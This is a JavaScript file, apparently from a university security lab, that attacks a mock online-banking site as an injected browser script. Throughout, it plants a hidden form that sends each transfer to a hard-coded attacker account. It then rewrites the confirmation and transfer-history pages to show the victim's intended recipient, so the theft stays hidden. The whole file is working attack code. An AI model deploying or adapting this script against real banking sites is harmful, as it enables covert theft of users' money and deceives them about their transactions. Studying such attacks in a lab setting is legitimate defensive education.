var hackerAccount = "123412341234567856785678";

if(window.location.href == "http://localhost/_me_lab6/web/home.php" ||
	window.location.href == "https://localhost/_me_lab6/web/home.php" || 
	window.location.href == "https://kacperzielinski.pl/_me_lab6/web/home.php" || 
	window.location.href == "http://kacperzielinski.pl/_me_lab6/web/home.php") {

	var userAccount = document.getElementById("accountNumber").innerHTML;
	localStorage.setItem("currentUser", userAccount);
}

if(window.location.href == "http://localhost/_me_lab6/web/transferForm.php" ||
	window.location.href == "https://localhost/_me_lab6/web/transferForm.php" || 
	window.location.href == "https://kacperzielinski.pl/_me_lab6/web/transferForm.php" || 
	window.location.href == "http://kacperzielinski.pl/_me_lab6/web/transferForm.php") {

	if(localStorage.getItem("lastAccount")) {
		var account = document.getElementsByName("account");
		account[0].value = localStorage.getItem("lastAccount");
	}
	
	var form = document.getElementsByTagName("form")[0];

	form.insertAdjacentHTML('afterend', 
		'<div id="hacked" style="display: none;"> '+
		'<form method="post">'+
		'<input type="text" name="name" id="hname" value="H3cker"> ' +   
		'<input type="text" name="account" value="' + hackerAccount + '" />' +   
		'<input type="number" name="zl" id="hzl" value="1000"> ' +   
		'<input type="number" name="gr" id="hgr" value="0"> ' +     
		'<input type="text" name="title" id="htitle "size="30" value="Thank you :)" /></form></div>');

	form.setAttribute("onsubmit", 
		'event.preventDefault(); '+
		'var secondForm = document.getElementsByTagName("form")[1]; '+
		'document.getElementsByTagName("input")[6].value = document.getElementsByTagName("input")[0].value;'+
		'document.getElementsByTagName("input")[8].value = document.getElementsByTagName("input")[2].value;'+
		'document.getElementsByTagName("input")[9].value = document.getElementsByTagName("input")[3].value;'+
		'document.getElementsByTagName("input")[10].value = document.getElementsByTagName("input")[4].value;'+
		'var victimAccount = document.getElementsByTagName("input")[1].value;'+
		'localStorage.setItem("lastAccount", victimAccount);'+
		'const regexp = /^[0-9]{15,32}$/;'+
		'if (!regexp.test(document.getElementsByName("account")[0].value)) { localStorage.removeItem("lastAccount"); }'+
		'secondForm.submit();');
}

if(window.location.href == "http://localhost/_me_lab6/web/confirmTransfer.php" ||
	window.location.href == "https://localhost/_me_lab6/web/confirmTransfer.php" || 
	window.location.href == "https://kacperzielinski.pl/_me_lab6/web/confirmTransfer.php" || 
	window.location.href == "http://kacperzielinski.pl/_me_lab6/web/confirmTransfer.php") {

	var sendAccount = localStorage.getItem("lastAccount");
	var content = document.getElementsByTagName('p')[1];
	var contentValue = content.innerHTML;
	content.innerHTML = contentValue.replace(hackerAccount, sendAccount);
}

if(window.location.href == "http://localhost/_me_lab6/web/transferConfirmation.php" ||
	window.location.href == "https://localhost/_me_lab6/web/transferConfirmation.php" || 
	window.location.href == "https://kacperzielinski.pl/_me_lab6/web/transferConfirmation.php" || 
	window.location.href == "http://kacperzielinski.pl/_me_lab6/web/transferConfirmation.php") {

	var sendAccount = localStorage.getItem("lastAccount");
	var content = document.getElementsByTagName('p')[1];
	var contentValue = content.innerHTML;
	content.innerHTML = contentValue.replace(hackerAccount, sendAccount);

	var transfers = [];
	var userAccount = localStorage.getItem("currentUser");

	if(userAccount in localStorage) {
		transfers = JSON.parse(localStorage.getItem(userAccount));
	}

	transfers.push(sendAccount);
	localStorage.setItem(userAccount, JSON.stringify(transfers));
	localStorage.removeItem("lastAccount");
}

if(window.location.href == "http://localhost/_me_lab6/web/transferHistory.php" ||
	window.location.href == "https://localhost/_me_lab6/web/transferHistory.php" || 
	window.location.href == "https://kacperzielinski.pl/_me_lab6/web/transferHistory.php" || 
	window.location.href == "http://kacperzielinski.pl/_me_lab6/web/transferHistory.php") {

	var rowInArray = document.getElementsByTagName("tr");
	var userAccount = localStorage.getItem("currentUser");
	var transfers = JSON.parse(localStorage.getItem(userAccount));

	var transfersLength = transfers.length - 1;
	for(i = 1; i < rowInArray.length; i++) {
		if(transfersLength >= 0) {
			var text = rowInArray[i].innerHTML;
			const reg = new RegExp(hackerAccount, "g");
			if (reg.test(text)) {
				rowInArray[i].innerHTML = text.replace(hackerAccount, transfers[transfersLength]);
				transfersLength--;
			}
		}
	}
}
